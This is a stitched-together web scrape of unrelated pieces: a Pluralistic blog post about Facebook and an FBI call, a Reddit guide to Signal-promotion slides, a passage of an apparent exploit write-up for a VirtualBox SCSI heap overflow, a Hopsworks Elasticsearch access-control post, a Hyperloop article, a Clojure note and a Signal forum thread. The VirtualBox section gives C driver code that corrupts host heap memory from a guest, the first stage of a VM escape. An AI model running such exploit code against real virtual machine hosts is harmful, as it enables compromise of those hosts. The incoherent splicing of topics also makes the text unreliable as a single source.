<p><a href="https://twitter.com/therecount/status/1348721745688211460">https://twitter.com/therecount/status/1348721745688211460</a></p>
<p>Translation: make rules that ban all the smaller platforms that compete with us, otherwise Qanon-addled musketfuckers will hogtie Congress with zip-cuffs and execute them under the Capitol Dome.</p>
<p>Even if that was true (and to be clear, <em>it is not true</em>), it would be a terrible idea.</p>
<p>But (again): <em>it's not true</em>.</p>
<p>"Facebook played a much larger role than Sandberg suggested."</p>

<ul>
<li>128,000 people used FB discuss the rally, many planned their trip using it
</li>
<li>
<p>24+ GOP politicians used FB to organize buses to the event</p>
</li>
</ul>
<p>Oh, and despite claiming otherwise FB STILL hasn't shut down election disinformation groups:</p>
<p><a href="https://www.buzzfeednews.com/article/janelytvynenko/stop-the-steal-facebook">https://www.buzzfeednews.com/article/janelytvynenko/stop-the-steal-facebook</a></p>
<p>As Mike Masnick says: "it's just gaslighting people to pretend that Facebook has the power to moderate away all bad behavior, and even dumber to pretend that no such planning happened on your platform."</p>

<p>Sandberg's position boils down to this: "if you're gonna get a fox to guard your henhouse, we should be that fox."</p>

<p>Yesterday was my 20th blogging anniversary. I admit that it carried more emotional freight than I expected. 20 years is a long time to do anything, let alone something that's so personal and yet so public.</p>
<p><a href="https://pluralistic.net/2021/01/13/two-decades/#hfbd">https://pluralistic.net/2021/01/13/two-decades/#hfbd</a></p>
<p>As it happens, an anonymous reader gave me a hell of a blogiversary gift: my first-ever FBI investigation! I've spoken to FBI agents before (Agent: Does your Tor exit node keep logs by any chance? Me: Nope. Agent: Dang), but I've never actually been <em>investigated</em>.</p>
<p>My phone rang with an unfamiliar local number. A calm voice on the other end introduced itself as an FBI special agent with the LA office. I pointed out that this was an unlikely claim and asked for a switchboard number I could call back on.</p>
<p>The agent said this was an entirely reasonable thing to do. A few minutes later, I was back on the phone with him.</p>
<p>Me: What can I do for you?</p>
<p>Him: I'm calling about a blog post you published. I'm sure you know which.</p>
<p>Me: Uh, no.</p>
<p>Him: The one about toppling statues.</p>
<p>He meant this post:</p>
<p><a href="https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage">https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage</a></p>
<p>tldr: it's a link to a Popular Mechanics article on the science of toppling monuments, with a brief intro and summary.</p>
<p>There's nothing illegal in that post, but also you should never talk to cops without a lawyer, so I asked him if he minded my setting up a time to make that happen. He said that was fine with him.</p>
<p>My EFF colleague Mark Rumold was kind enough to volunteer to call the special agent. He reported back shortly thereafter to say that the agent was responding to a complaint, and that he agreed my post was not unlawful in any way.</p>
<p>Mark confirmed for the agent that I was not planning any unlawful activity, and the agent asked him to remind me that people can misinterpret the things we publish on the internet.</p>
<p>That was it.</p>
<p>It was an anticlimax, sure. I confess that I was a little freaked out. It was just the anniversary of Aaron Swartz's death, and my mind kept going back to his account of the time the FBI showed up to ask him about PACER, and the horrors that followed.</p>
<p>But it's over. The agent, to his credit, was pleasant and reasonable. But I'm mystified by the complaint – my guess is some troll has figured out that you can sic the FBI on people you disagree with on the internet – and even more by the fact that the FBI acted on it.</p>
<p>They must have the discretion to decide when a complaint rises to the level of using a special agent's time and when it should go in the kook folder. Seems to me that filing complaints about my post in the kook folder should have been a no-brainer.</p>
<p>I'm looking into using FOIA and the 1974 Privacy Act to find out what kind of file this generated, and to have that record expunged.</p>

<p>In the meantime, I'm declaring a federal criminal investigation to be the Official 20th Blogiversary gift.</p>

<p>The Cold War is memorialized as a moment in which the world split into two: the east and west, the Warsaw Pact and NATO. But a sizeable number of countries sat out the Cold War, and many of them formed a third bloc called the "nonaligned countries."</p>
<p>The nonaligned movement's founding member was Yugoslavia, and it became a socialist republic on the USSR's doorstep that had a simmering (and at times openly) hostile relationship with its vast neighbor.</p>
<p>This betwixt/between posture left Yugoslavia cut off from both Hollywood movies and Soviet cinema: naturally, they turned to the Mexican film industry.</p>
<p>The 1950s and 60s were the Yu-Mex moment, when the nation thrilled to imported Mexican movies that glorified the Mexican revolution. On Global Voices, Filip Stojanovski tells the story of a quarter century of Yugoslavian …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- SC_OFF --><div><p><strong>**UPDATE: Ready to use after WA announced T&amp;C delay! New languages: Slovak, Czech, Portuguese (PT), Finnish, Turkish, Hindi, Spanish, Portuguese (BR), Italian, French, Dutch - more coming soon*\</strong>*</p>

<blockquote>
<p>Hey there, I'm using Signal!</p>
</blockquote>

<p>When people switch to Signal they often have the problem to convince all their contacts from WhatsApp to do the same. I had that struggle too.</p>

<p>That's why I created something to put into my WhatsApp Status: around 20 slides explaining why to switch and why I am going to delete WhatsApp. I think it's better to be educational than pushy or insulting to get people to switch, so I tried it this way and successfully got my family and friends to switch to Signal.</p>

<p>Now I decided to share the slides with you and hope they help you too!</p>



<p>There are 2 versions for each language: One including a comment about GDPR (for EU citizens) and one that does not mention anything about GDPR (rest of world).</p>

<p>F<em>or UK users:</em> <a href="https://teddit.net/u/Winnie_the_Pooch">u/Winnie_the_Pooch</a> <em>commented: "[...] use the EU version. Even though weâ€™ve now left, the EU GDPR has (thankfully!) been enshrined in British law as the</em> <a href="https://ico.org.uk/for-organisations/dp-at-the-end-of-the-transition-period/data-protection-now-the-transition-period-has-ended/the-gdpr/"><em>UK GDPR</em></a> <em>[...]". Lucky you!</em></p>



<p>WhatsApp delays their privacy policy update to <strong>mid of may</strong>!</p>

<p><strong>But this does not change the facts mentioned in the slides about metadata etc.!</strong> So, why should you wait until may? On the other hand, you now have more time to convince your contacts to switch!</p>

<p><strong>UPDATE:</strong> I updated each version like the following:</p>

<ul>
<li>The first slide does not have a headline anymore. You can add your own text here using the editing options in WhatsApp (its the T on the top right) or your favorite graphic editing software. Write something along the line as "I will delete WhatsApp on [insert date here]" or similar.</li>
<li>I replaced the last two chat messages on slide 03 with the text from slide 04. Total amount of slides reduced to 19!</li>
</ul>

<p><strong>Before sharing your new WhatsApp Status check if the Signal service is currently up and running:</strong> <a href="https://status.signal.org/">status.signal.org</a> (if it is down you should wait, as your contacts may not be able to register!)</p>

<p><strong>How to contribute</strong></p>

<p><em>Coming soon</em> means you don't have to send me translations for this language anymore, I just need to add them. Please be patient.</p>

<p>If you like to have the status in your language too: <a href="https://pastebin.com/Fc9Xcadi">here is the raw text</a> (try to not change the formatting please). Please translate only into languages you are fluent in.</p>

<p>!Please also provide a screenshot of the "New privacy policy" message  in your language for the 2nd slide. Search the web if needed!</p>



<p>Please look into related subreddits to get familiar with the topic:</p>

<ul>
<li><a href="https://teddit.net/r/signal">r/signal</a></li>
<li><a href="https://teddit.net/r/whatsapp">r/whatsapp</a></li>

<li><a href="https://teddit.net/r/privacytoolsIO">r/privacytoolsIO</a></li>
</ul>

<p><strong>How to add WhatsApp Status in the correct order</strong></p>

<ol>
<li>First, take a look in your WhatsApp Status privacy settings and make sure to select all the contacts you want to see your new status.</li>
<li>Open the gallery app.</li>
<li>Select all images, starting from the first slide (1-19).</li>
<li>Press share.</li>
<li>Select WhatsApp.</li>
<li>Select "My Status" &amp; make sure the slides are in the correct order.</li>
<li>Add your custom intro text on slide 01.</li>
<li>Send. Done.</li>
</ol>

<p><strong>Best practices</strong></p>

<p>Think about what time is best to post your status. Think about what your contacts are probably doing at the moment. They might not want to read 20 slides of text while they are at work.</p>

<p>At last position in your story I recommend the video from <a href="https://teddit.net/r/signal/comments/kv54u7/best_signal_video_for_your_whatsapp_status/">this post</a> (credits to <a href="https://teddit.net/u/carlosfx">u/carlosfx</a> !).</p>

<p>Signal published a <a href="https://twitter.com/signalapp/status/1349236175773462532">replacement for your profile pic</a> on their twitter account.</p>

<p><a href="https://teddit.net/u/Xath0n">u/Xath0n</a> suggested to put a text status with a direct link to <a href="https://signal.org/downloads">signal.org/downloads</a> at the end, so people don't need to search for it (Signal is in the top charts in the app stores currently, so it shouldn't be too hard to find anyway).</p>

<p>You can also thank everyone for watching your TED talk, lol.</p>

<p>If you think most of your contacts don't look into WhatsApp Status you can do the following:</p>

<ul>
<li>let them know that you want them to look into your WA Status, because it's important to you</li>
<li>send the slides to your contacts directly or in a group chat</li>
<li>send them the link to the images (note that the mobile view of imgbox is not the best)</li>
</ul>



<ul>
<li>I know that 19+ slides are a lot for a single WhatsApp Status and people might not read it <strong>but it is worth a try.</strong></li>
<li>It is intentionally written in simple terms to be understood by people who are not as tech savvy as you are.</li>
<li>Be prepared for questions, arguments, debates and to provide evidence of what your new status is saying (look up this subreddit for more info). Make sure you know the facts!</li>
<li>The style of the content may not appeal to everyone in your contact list.</li>
<li>Remember that some of your contacts don't look at WA Status at all.</li>
</ul>



<p><strong>Animated Status</strong> (old date)</p>

<p><a href="https://teddit.net/user/JordyEGNL/">u/JordyEGNL</a> submitted an animated version of the EN (for EU citizens) status: <a href="https://teddit.net/r/signal/comments/kx4msl/i_transformed_the_pictures_of_ucrazylizards_post/">check it out</a> !</p>

</code></pre><p>The <code>SCSI</code> device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can’t write that same byte and vice versa, because the buffer pointer has already been advanced.</p><p>While auditing the <code>vboxscsiReadString</code> function, <a href="https://twitter.com/_tsuro">tsuro</a> and <a href="https://twitter.com/__spq__">spq</a> found something interesting:</p><pre><code><span>// src/VBox/Devices/Storage/VBoxSCSI.cpp</span>

</code></pre><p>We can fully control <code>cbTransfer</code> in this function. The function initially makes sure that we’re not trying to read more than the buffer size <code>[1]</code>. Then, it copies <code>cbTransfer</code> bytes from the global buffer into another buffer <code>[2]</code>, which will be sent to the guest driver. Finally, <code>cbTransfer</code> bytes get subtracted from the remaining size of the buffer <code>[3]</code> and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes.</p><p>So much for the logic, but what’s the issue here? There is a check at <code>[1]</code> that ensures no single read operation reads more than the buffer’s size. But this is the wrong check. It should verify, that no single read can read more than the buffer <strong>has left</strong>. Let’s say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in <code>[1]</code> won’t bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in <code>[3]</code> to underflow and <code>cbBufLeft</code> will be set to <code>UINT32_MAX-1</code>. This same <code>cbBufLeft</code> will be checked when doing write operations and since it is very large now, we’ll be able to also write bytes that are outside of our buffer.</p><h2 id="getting-oob-readwrite"> <a href="#getting-oob-readwrite">Getting OOB read/write</a></h2><p>We understand the vulnerability, so it’s time to develop a driver to exploit it. Ironically enough, the “getting a driver to build” part was actually one of the hardest (and most annoying) parts of the exploit development. <a href="https://twitter.com/fktio">malle</a> got to building VirtualBox from source in order for us to have symbols and a debuggable process while <a href="https://twitter.com/0x4d5aC">0x4d5a</a> came up with the idea of using the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a> driver as a base for us to work with, since it does some similar things to what we need. Now let’s finally start writing some code.</p><p>Here’s how we triggered the bug:</p><pre><code><span>void</span> exploit() {
    <span>static</span> <span>const</span> <span>uint8_t</span> cdb[<span>1</span>] <span>=</span> {<span>0</span>};
    <span>static</span> <span>const</span> <span>short</span> port <span>=</span> <span>0x434</span>;
    <span>static</span> <span>const</span> <span>uint32_t</span> buffer_size <span>=</span> <span>1024</span>;

    <span>// reset the state machine</span>
    __outbyte(port<span>+</span><span>3</span>, <span>0</span>);

    <span>// initiate a write operation</span>
    __outbyte(port<span>+</span><span>0</span>, <span>0</span>); <span>// TargetDevice (0)</span>
    __outbyte(port<span>+</span><span>0</span>, <span>1</span>); <span>// direction (to device)</span>
    
    __outbyte(port<span>+</span><span>0</span>, ((buffer_size <span>&gt;&gt;</span> <span>12</span>) <span>&amp;</span> <span>0xf0</span>) <span>|</span> (<span>sizeof</span>(cdb) <span>&amp;</span> <span>0xf</span>)); <span>// buffer length hi &amp; cdb length</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size);                                        <span>// bugger length low</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size <span>&gt;&gt;</span> <span>8</span>);                                   <span>// buffer length mid</span>
    
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(cdb); i<span>++</span>)
        __outbyte(port<span>+</span><span>0</span>, cdb[i]);


    <span>// move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8</span>
    <span>char</span> buf[buffer_size];
    __inbytestring(port<span>+</span><span>1</span>, buf, buffer_size <span>-</span> <span>1</span>)    <span>// Read bufsize-1</span>
    __inbytestring(port<span>+</span><span>1</span>, buf, <span>9</span>)                  <span>// Read 9 more bytes</span>

    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(buf); i <span>+=</span> <span>4</span>)
        <span>*</span>((<span>uint32_t</span><span>*</span>)(<span>&amp;</span>buf[i])) <span>=</span> <span>0xdeadbeef</span>
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>10000</span>; i<span>++</span>)
        __outbytestring(port<span>+</span><span>1</span>, buf, <span>sizeof</span>(buf))
}

</code></pre><p>The driver first has to initiate the <code>SCSI</code> state machine with a <code>bufsize</code>. Then we read <code>bufsize-1</code> bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated <code>buffer+8</code> with <code>0xdeadbeef</code>.</p><p>After loading this driver in the win7 guest, this is what we get: <img src="https://secret.club/assets/sauercl0ud/VM-aborted.png" alt=""></p><p>As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this <code>Req</code> struct via an <code>IOCTL</code>:</p><pre><code><span>enum</span> operations {
    OPERATION_OUTBYTE <span>=</span> <span>0</span>,
    OPERATION_INBYTE <span>=</span> <span>1</span>,
    OPERATION_OUTSTR <span>=</span> <span>2</span>,
    OPERATION_INSTR <span>=</span> <span>3</span>,
};

<span>typedef</span> <span>struct</span> {
    <span>volatile</span> <span>unsigned</span> <span>int</span> port;
    <span>volatile</span> <span>unsigned</span> <span>int</span> operation;
    <span>volatile</span> <span>unsigned</span> <span>int</span> data_byte_out;
} Req;
</code></pre><p>This enables us to use the driver as a bridge to communicate with the <code>SCSI</code> device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D).</p><p>The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let’s put this bug to use!</p><h2 id="leaking-vboxcdll-and-heap-addresses"> <a href="#leaking-vboxcdll-and-heap-addresses">Leaking <code>vboxc.dll</code> and heap addresses</a></h2><p>We’re able to dump heap data using our OOB read but we’re still far from code execution. This is a good point to start …</p></div></div>

More concretely, Hopsworks now supports dynamic <a href="https://en.wikipedia.org/wiki/Role-based_access_control#:~:text=Role%2Dbased%20access%20control%20(RBAC)%20is%20a%20policy%2D,simple%20to%20perform%20user%20assignments.">role-based access control</a> (RBAC) to indexes in elasticsearch with no performance penalty by building on Open Distro for Elasticsearch (ODES).<br></p><p>In January 2021, <a href="https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">Elastic switched from the Apache V2 open-source license</a> for both Elasticsearch and Kibana to a non open-source license to Server Side Public License (SSPL).</p><p>Hopsworks is an open-source platform that includes Open Distro for Elasticsearch (a fork of Elasticsearch) and Kibana.</p><p>In Hopsworks, we use Elasticsearch to provide free-text search for AI assets (features, models, experiments, datasets, etc). We also make Elasticsearch indexes available for use by programs run in Hopsworks. As we interpret it, the latter functionality means we contravene the licensing terms of the SSPL:</p><blockquote>“If you make the functionality of the Program or a modified version available to third parties as a service... (license conditions apply)”</blockquote><p>‍</p><p>Luckily, we recently made the switch from Elasticsearch to <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a>, supported by AWS, which is Apache v2 licensed.<br></p><p>Open Distro for Elasticsearch supports Active Directory and LDAP for authentication and authorization. <a href="https://opendistro.github.io/for-elasticsearch-docs/old/0.9.0/docs/security/permissions/">Using the Security plugin</a>, you can use RBAC to control the actions a user can perform. A role defines the cluster operations and index operations a user can perform, including access to indices, and even fine-grained field and document level access. RBAC allows an administrator to define a single security policy and apply it to all members of a department. But individuals may be members of multiple departments, so a user might be given multiple roles. <a href="https://link.springer.com/chapter/10.1007/978-3-540-85776-1_17">With dynamic role-based access control</a> you can change the set of roles a user can hold at a given time. </p><p>For example, if a user is a member of two departments - one for accessing banking data and another one for accessing trading data, with dynamic RBAC, you could restrict the user to only allow her to hold one of those roles at a given time. The policy for deciding which role the user holds could, for example, depend on what VPN (virtual private network) the user is logged in to or what building the user is present in. In effect, dynamic roles would allow the user to hold only one of the roles at a time and sandbox her inside one of the domains - banking or trading. It would prevent her from cross-linking or copying data between the different trading and banking domains.</p><p>Hopsworks implements a dynamic role-based access control model through its project-based multi-tenant security model<strong>. </strong>&nbsp;Every Project has an <strong>owner</strong> with full read-write privileges and zero or more <strong>members</strong>.&nbsp; A project owner may invite other users to his/her project as either a <strong>Data Scientist </strong>(read-only privileges and run jobs privileges) or <strong>Data Owner</strong> (full privileges). Users can be members of (or own) multiple Projects, but inside each project, each member (user) has a unique identity - we call it a <em>project-user identity</em>.&nbsp; For example, user <em>Alice</em> in <em>Project A</em> is different from user <em>Alice </em>in <em>Project B - </em>(in fact, the system-wide (project-user) identities are <strong><em>ProjectA__Alice</em></strong> and <strong><em>ProjectB__Alice</em></strong>, respectively)<em>. </em></p><p><em>‍</em>As such, each project-user identity is effectively a role with the project-level privileges to access data and run programs inside that project. If a user is a member of multiple projects, she has, in effect, multiple possible roles, but only one role can be active at a time when performing an action inside Hopsworks. When a user performs an action (for example, runs a program) it will be executed with the project-user identity. That is, the action will only have the privileges associated with that project. The figure below illustrates how Alice has a different identity for each of the two projects (A and B) that she is a member of. Each project contains its own separate private assets. Alice can use only one identity at a time which guarantees that she can’t access assets from both projects at the same time.</p><p>Hopsworks enables you to host sensitive data in a shared cluster using a <a href="https://www.logicalclocks.com/blog/how-we-secure-your-data-with-hopsworks">project-based access control security model</a> (an implementation of dynamic role-based access control). In Hopsworks, a project is a secure sandbox with members, data, code, and services. Similar to GitHub repositories, projects are self-service: users manage membership, roles, and can securely share data assets with other projects. This <em>project-based multi-tenant security model</em> enables users to host both sensitive and shared data in a single Hopsworks cluster - you do not need to manage and pay for separate clusters.&nbsp;<br></p><figure id="w-node-14452fea4591-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bafe67f9a01f3d5100b3_Screenshot%202021-01-15%20at%2016.54.57.png" loading="lazy" alt=""></p></figure><p>‍</p><p>An important aspect of project-based multi-tenancy is that assets can be shared between projects - sharing does not mean that data is duplicated. The current assets that can be shared between projects are: files/directories in HopsFS, Hive databases, feature stores, and Kafka topics. For example, in the figure below there are three users (User1, User2, and User3)&nbsp; and two projects (A and B). User1 is a member of project A, while User2 and User3 are members of project B. All three users (User1, User2, User3) can access the assets shared between project A and project B. As sharing does not mean copying, the access control rules for the asset are updated to give users in the other project read or write permissions on the shared asset.</p><p>‍<br></p><figure id="w-node-213ef0acf495-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb182dbe7b79013d5093_Screenshot%202021-01-15%20at%2016.55.17.png" loading="lazy" alt=""></p></figure><p>‍</p><p>P<em>roject-user identity</em> is primarily based on a X.509 certificate issued internally by Hopsworks. Access control policies, however, are implemented by the platform services (HopsFS, Hive, Feature Store, Kafka), and for Elasticsearch Open Distro, permissions are managed using an open-source <a href="https://github.com/logicalclocks/elasticsearch-chef">Hopsworks project-based authorizer plugin</a>.</p><p>The following PySpark code snippet, <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-python.ipynb">available as a notebook</a> when you run the Spark Tour on Hopsworks, shows how to read from an index that is private to a project from PySpark. There is also an <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-scala.ipynb">equivalent Scala/Spark notebook</a>.</p><p>

Every user and every service in a Hopsworks cluster has a private key and an X.509 certificate. Hopsworks projects also support multi-tenant services that are not currently backed by X.509 certificates, including Elasticsearch. <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a> supports authentication and access control using JSON Web Tokens (<a href="https://dzone.com/articles/what-is-jwt-token">JWT</a>).&nbsp; Similar to application X.509 certificates, Hopsworks’ resource manager (HopsYARN) issues a JWT for each submitted job and propagates it to running containers. Using the JWT, user code can then securely make calls to Elasticsearch indexes owned by the project. The JWT is rotated automatically before it expires and invalidated by HopsYARN once the application has finished.<br></p><p>For every Hopsworks project, a number of private indexes can be created in Elasticsearch: an index for real-time logs of applications in that project (accessible via Kibana), an index for ML experiments in the project, and an index for provenance for the project’s applications and file operations. Elastic indexes are private to the project - they are not accessible by users that are not members of the project. This access control is implemented as follows: when a request is made on Elasticsearch using a JWT token, our authorizer plugin extracts the project-specific username from the JWT token, which is of the form:<strong><em>‍</em></strong></p><p>‍<strong><em>ProjectA__Alice</em></strong>&nbsp;</p><p>The index names have the following form:</p><p><strong><em>ProjectA__ElasticIndex</em></strong>&nbsp;</p><p>Our plugin checks if a project-specific user is allowed to read/write an index by checking that the prefix (<strong>ProjectA</strong>) of both the user and the index match one another. We plan to add support for sharing elasticsearch indexes between projects by storing a list of projects allowed to perform read and write operations, respectively, on the indexes belonging to a project.</p><h2>X.509 Service certificates</h2><p>In Hopsworks, services communicate with each other using their own certificate to authenticate and encrypt all traffic. Each service in Hopsworks, that supports TLS encryption and/or authentication, has its own service-specific X.509 certificate, including all services in the ELK Stack (Elasticsearch, Kibana, and Logstash). Service certificates contain the Fully Qualified Domain Name (FQDN) of the host they are installed on and the login name of the system user that the process runs as. They are generated when a user provisions Hopsworks, and they have a long lifespan. Service certificates can be rotated automatically in configurable intervals or upon request of the administrator.&nbsp;</p><h2>Securely accessing Elastic Indexes in Jobs on Kubernetes&nbsp;<br></h2><figure id="w-node-d2ae8e066750-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bc186b327c00f6b51384_Screenshot%202021-01-15%20at%2016.59.47.png" loading="lazy" alt=""></p></figure><p>Hopsworks can be integrated with Kubernetes by configuring it to use one of the available authentication mechanisms: API tokens, credentials, certificates, and IAM roles for AWS’ managed EKS offering. Hopsworks can run users’ jobs on Kubernetes that have project-specific security material,&nbsp; X.509 certificates and JWTs, materialized to the launched Pods so user code can securely access services in Hopsworks, such as Open Distro for …</p></div></div></div></div></div></div>

Possibly one of the greatest leaps in transportation for generations, the concept promises to slash journey times between cities from several hours to a matter of minutes. Musk first mentioned that he was thinking about a concept for a "fifth mode of transport", calling it the Hyperloop, in July 2012 at a PandoDaily event in Santa Monica, California. He envisions the more advanced versions will be able to go at hypersonic speed.</span></p><blockquote id="viewer-4l8mu"><span>It's cross between a Concorde, a railgun, and an air hockey table - <strong>Elon Musk - CEO of Tesla and SpaceX </strong></span></blockquote><p id="viewer-bedt"><span>Since 2015, the yearly Hyperloop Pod Competition sponsored by SpaceX allowed student and non-student teams to participate, design and for some, build a subscale prototype transport vehicle in order to demonstrate the technical feasibility of various aspects of the Hyperloop concept.</span></p><h2 id="viewer-dkdqo"><span>An Important Milestone </span></h2><p id="viewer-8io9u"><span>The test took place on November 8, 2020, at the Virgin Hyperloop's DevLoop test track in the desert outside Las Vegas, Nevada. The first two passengers were Virgin Hyperloop’s chief technology officer and co-founder, Josh Giegel, and head of passenger experience, Sara Luchian. </span></p><p id="viewer-2jrma"><span>The test was completed with the newly-unveiled XP-2 vehicle, which was custom-built with occupant safety and comfort in mind. While the production vehicle will be larger and seat up to 28 passengers, this 2-seater XP-2 vehicle was built to demonstrate that passengers can in fact safely travel in a hyperloop vehicle.</span></p><p id="viewer-91v5a"><span>The pod accelerated up to 100 miles per hour (160 km/h) down the length of the 500 meters long track, before slowing down to a stop.</span></p><p id="viewer-b9ns9"><span>This is an incredible milestone for Virgin Hyperloop, one of the leaders in the race to build the first fully functional Hyperloop system, as it proves the safety of this futuristic mode of transport.</span></p><blockquote id="viewer-2ftb9"><span>"I can’t tell you how often I get asked ‘is hyperloop safe?’, with today’s passenger testing, we have successfully answered this question" - <strong>Jay Walder, CEO of Virgin Hyperloop</strong></span></blockquote><h2 id="viewer-e8h4d"><span>What's Next?</span></h2><p id="viewer-4ab2"><span>This is not only a big step for Virgin Hyperloop, but it will also motivate other companies working on this technology, like <a href="https://www.hyperlooptt.com/" target="_blank" rel="noopener"><u>Hyperloop Transportation Technology</u></a> (HTT), <a href="https://www.transpod.com/" target="_blank" rel="noopener"><u>Transpod Inc</u></a>, or even <a href="https://tumhyperloop.de/" target="_blank" rel="noopener"><u>TUM Hyperloop</u></a>, a student team from the Technical University of Munich, to perform similar tests bring us closer to a faster, safer and greener future.</span></p><p id="viewer-do2ms"><span>All of these companies are working closely with governments and partners to help advance their technology and construction, in countries like India, the United States, Belgium, France and the United Arab Emirates.</span></p><p id="viewer-ccijs"><span>For more about the Hyperloop, <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>check out our article</u></a> covering <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>everything you need</u></a> to know about this futuristic technology, from how it works, to who's building it, to what the potential cost could be!

<p>This is a change from my previous relationship with the Clojure Core team that in the past few years has been sporadic at best. This circumstance arose through necessity rather than desire and so I’m overjoyed to work closely with the team once again. Over the past few years <a href="https://twitter.com/puredanger">Alex Miller</a> has exerted a Herculean effort in shepherding the language through numerous versions and steady growth. I’m overjoyed to be given the opportunity to join him in helping push the language forward, and I’ll do my very best to avoid breaking everything.</p>

<p>So what this means is that I’ll be far more visible<sup id="fnref:v"><a href="#fn:v" rel="footnote">1</a></sup> in and around the Clojure ecosystem while spending my time thinking about Clojure more so than just using Clojure.<sup id="fnref:cljs"><a href="#fn:cljs" rel="footnote">2</a></sup></p>

<p>Anecdotal evidence (from the above thread) warns that users unfamiliar with IME (or careless about its risks) are promoting Signal as “secure” without pointing out the dangers associated with third-party IME. This undercuts the purpose of the app for a large group of people, many of whom face far graver consequences for insecure communications than their English-speaking counterparts.</p>
<p>When Signal detects the user speaks a language likely to be accompanied by third-party IME, it should visibly warn the user of the risks.</p>

<p>Wait so just to be clear, the “signal vulnerability” is that Android’s Chinese keyboard sucks and people use a third party app?</p>
</blockquote>
<blockquote>
<p>While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>
</blockquote>
<p>“Responsibility” is a bit illusory. I think it’s more useful to consider how easy it would be to add a feature that could really help people. If the impact outweighs the difficulty (and I think it probably does), then whether Signal is obligated to make the change seems like a red herring.</p>
<p>One philosopher could argue that the developers are responsible for nothing, since the app is free. Another could argue that they’re responsible for every possible “butterfly effect” of their decisions. That debate is a bit academic and I don’t think especially helpful for making decisions about feature requests.</p>
<blockquote>
<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
</blockquote>
<p>Loss of users’ trust if the app gives the impression of “spying” on their language is a fair concern. But I think it could be implemented in a way that “tracks” nothing and offers a warning that allays any user concerns. For example, there could be a heuristic of “50% or more Chinese characters”. The first time an outgoing message triggers that heuristic, Signal could display a one-time warning. For example" It looks like you’re writing in Chinese. If you are using a third-party Chinese keyboard, it may not be secure. Consider using the phone’s built-in keyboard."</p>

<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
</blockquote>
<p>Absolutely, and I wouldn’t recommend any form of policing. But a well-timed and well-placed warning of this <em>very</em> common threat wouldn’t be (and I don’t think would even be perceived as) policing. The warning could be phrased in a way that emphasizes the risks of using third-party IME <em>alongside</em> Signal and makes no general claims about whether the user should take advantage of those apps in other contexts.</p>

<p>That sounds like it has the potential to be a really slick heuristic. “You seem to be using X app… here’s why that might be a problem.” On the other hand, there might be a higher risk of false positives than with a “50%+ Chinese characters” heuristic. I’ll have to defer to folks who know more about app development.</p>

          <p>Well, it has sometimes uses if you want to launch another app from an app with an intent. For example, if your app includes a user manual in pdf form and wants to show it in the standard pdf reader on the device. If there is no pdf reader you want to give a warning explaining the issue.</p>
<p>Code to heck it is really easy, see <a href="https://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run" rel="nofollow noopener">this article on Stackoverflow</a> how to do that.</p>
<p>The asked for checksum would require to locate the installed apk and read it, which requires root. And split apk’s would make it even more difficult.</p>

          <p>There was a lot of discussion on warning users that notifications could also be logged. It seems like there are a lot of problematic things in Android that people need to be aware of and protect themselves accordingly. I’m not sure how much of a role Signal should play in that or even if it needs to.</p>
<p>Other things I can immediately think of:<br>
export a photo?it might get stored in some cloud service<br>
listening to a voice note? the digital assistant might also be listening to it</p>

          <p>I understand the argument. The issue is that with the huge influx of new users, Signal do have a responsibility to flag such potential security flaws.</p>
<p>It seems like a pretty obvious thing for them to offer an untracked keyboard option in the app anyway, like some banking apps do. Or just a warning to ensure your Android device is secure.</p>

        <p>I agree that Signal should warn users who are using insecure IME. Signal has a responsibility to clearly communicate attack vectors to users, especially as an increasing number of less sophisticated users join the platform.</p>

        <p>Do you mean the incognito keyboard setting or do you want them to include a keyboard of their own? If the latter, it probably could be a well vetted separate app that someone else provides.</p>

